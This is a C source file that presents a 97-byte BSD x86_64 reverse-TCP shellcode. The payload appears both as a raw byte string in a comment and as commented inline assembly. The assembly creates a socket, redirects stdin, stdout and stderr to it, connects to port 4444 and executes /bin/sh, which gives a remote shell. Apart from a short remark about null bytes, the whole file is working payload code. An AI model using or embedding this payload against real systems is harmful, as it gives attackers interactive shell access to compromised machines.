/*
BSD x86_64 reverse_tcp shellcode, 97 bytes
Balazs Bucsay
@xoreipeip | earthquake <at@> rycon <do.t> hu  
http://rycon.hu

port = 4444
ip = ::1

The shellcode contains some null bytes, that can be removed easily with
some shellcoding experience. But it increases the length of the code with 
a few additional bytes.

char shellcode[] = \
"\x6a\x61\x58\x99\x6a\x1c\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x04\x3e\x0f\x05"
"\xff\xc6\x04\x59\x0f\x05\xff\xce\xff\xce\x04\x58\x0f\x05\x52\x48\xbb\x00"
"\x00\x00\x00\x00\x00\x00\x01\x53\x48\xc7\xc3\x00\x00\x00\x00\x53\x48\xc7"
"\xc3\x00\x1c\x11\x5c\x53\x48\x89\xe6\x6a\x1c\x5a\x66\x83\xc0\x62\x0f\x05"
"\x99\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x52\x57"
"\x48\x89\xe6\x04\x3b\x0f\x05"
*/

int main() 
{
	asm(
	// socket(28,1,0);
	"	push $97		\n"
	"	pop %rax		\n"
	"	cltd			\n"
	"	push $28		\n"
	"	pop %rdi		\n"
	"	push $1			\n"
	"	pop %rsi		\n"
	"	syscall	   		\n"
	
	// dup2(s, 1);
	"	xchg %rax, %rdi		\n"
	"	add $62, %al		\n"
        "       syscall                 \n"

	// dup2(s, 2);
        "       inc %esi                \n"
        "       add $89, %al            \n"
        "       syscall                 \n"

	// dup2(s, 0);
        "       dec %esi                \n"
        "       dec %esi                \n"
        "       add $88, %al            \n"
        "       syscall                 \n"

	// connect(s, struct, 28)
	"	push %rdx		\n"
	"	mov $0x0100000000000000, %rbx\n"
	"	push %rbx		\n"
	"	mov $0x0000000000000000, %rbx\n"
	"	push %rbx		\n"
	"	mov $0x000000005c111c00, %rbx\n"
	"	push %rbx		\n"
	"	mov %rsp, %rsi		\n"
	"	push $28	  	\n"
	"	pop %rdx		\n"
	"	add $98, %ax\n"
	"	syscall	   		\n"
	
	// execve("/bin/sh", {"/bin/sh", 0}, 0)
	"	cltd			\n"
	" 	push %rdx		\n"
	"	mov $0x68732f6e69622f2f, %rdi\n"
	"	push %rdi		\n"
	"	mov %rsp, %rdi		\n"
	"	push %rdx		\n"
	"	push %rdi		\n"
	"	mov %rsp, %rsi		\n"
	"	add $59, %al		\n"
	"	syscall	   		\n"
	);
}
